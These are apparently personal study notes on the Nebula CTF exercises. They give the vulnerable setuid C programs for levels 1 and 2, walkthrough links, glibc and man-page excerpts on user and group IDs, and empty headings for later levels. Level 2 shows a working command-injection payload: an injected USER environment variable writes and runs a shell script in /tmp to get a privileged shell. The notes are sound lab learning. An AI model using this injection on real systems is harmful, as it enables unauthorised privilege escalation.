TEST KALI LINUX 2018.1 64-BIT

========================================================
LEVEL1
========================================================
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);
  getchar();
  system("/usr/bin/env echo and now what?");
  system("/usr/bin/env echo BreakAllCTF{this is your first win}");
  getchar();
}

在return後面的都不會執行

https://www.youtube.com/watch?v=-mtOlyxyJx4

========================================================
LEVEL2

There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?
========================================================
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);
  
  system(buffer);
}

---------------------------------------------------------------------
injecting code into the echo command

https://cybergibbons.com/security-2/nebula-walkthrough/nebula-exploit-exercises-walkthrough-level02/
https://www.youtube.com/watch?v=olAKc05CAg8{不錯}

USER='-e "#!/bin/bash\n/bin/bash" > /tmp/level02; chmod +x /tmp/level02; /tmp/level02'

export USER

./flag02
about to call system("/bin/echo -e "#!/bin/bash\n/bin/bash" > /tmp/level02; chmod +x /tmp/level02; /tmp/level02 is cool")

getflag
You have successfully executed getflag on a target account
---------------------------------------------------------------------
http://www.gnu.org/software/libc/manual/html_node/Reading-Persona.html
detailed descriptions of the functions for reading the user and group IDs of a process, both real and effective. 
To use these facilities, you must include the header files sys/types.h and unistd.h.

Data Type: uid_t
This is an integer data type used to represent user IDs. In the GNU C Library, this is an alias for unsigned int.

Data Type: gid_t
This is an integer data type used to represent group IDs. In the GNU C Library, this is an alias for unsigned int.

Function: uid_t getuid (void)
Preliminary: | MT-Safe | AS-Safe | AC-Safe | See POSIX Safety Concepts.

The getuid function returns the real user ID of the process.

Function: gid_t getgid (void)
Preliminary: | MT-Safe | AS-Safe | AC-Safe | See POSIX Safety Concepts.

The getgid function returns the real group ID of the process.

Function: uid_t geteuid (void)
Preliminary: | MT-Safe | AS-Safe | AC-Safe | See POSIX Safety Concepts.

The geteuid function returns the effective user ID of the process.

Function: gid_t getegid (void)
Preliminary: | MT-Safe | AS-Safe | AC-Safe | See POSIX Safety Concepts.

The getegid function returns the effective group ID of the process.

Function: int getgroups (int count, gid_t *groups)
Preliminary: | MT-Safe | AS-Safe | AC-Safe | See POSIX Safety Concepts.

The getgroups function is used to inquire about the supplementary group IDs of the process. 
Up to count of these group IDs are stored in the array groups; the return value from the function is 
the number of group IDs actually stored. If count is smaller than the total number of supplementary group IDs, 
then getgroups returns a value of -1 and errno is set to EINVAL.

If count is zero, then getgroups just returns the total number of supplementary group IDs. 
On systems that do not support supplementary groups, this will always be zero.


setresuid()
https://linux.die.net/man/2/setresgid
etresuid, setresgid - set real, effective and saved user or group ID Synopsis

 #define _GNU_SOURCE /* See feature_test_macros(7) */

#include <unistd.h>
int setresuid(uid_t ruid, uid_t euid, uid_t suid);
int setresgid(gid_t rgid, gid_t egid, gid_t sgid);

Description
setresuid() sets the real user ID, the effective user ID, and the saved set-user-ID of the calling process.
Unprivileged user processes may change the real UID, effective UID, and saved set-user-ID, each to one of: 
the current real UID, the current effective UID or the current saved set-user-ID.

Return Value
On success, zero is returned. On error, -1 is returned, and errno is set appropriately.

========================================================
LEVEL3
========================================================


========================================================
LEVEL4
========================================================


========================================================
LEVEL5
========================================================


========================================================
LEVEL6
========================================================


========================================================
LEVEL7
========================================================


========================================================
LEVEL8
========================================================


========================================================
LEVEL9
========================================================


========================================================
LEVEL10
========================================================


========================================================
LEVEL11
========================================================


========================================================
LEVEL12
========================================================

========================================================
LEVEL13
========================================================

========================================================
LEVEL14
========================================================


========================================================
LEVEL15
========================================================
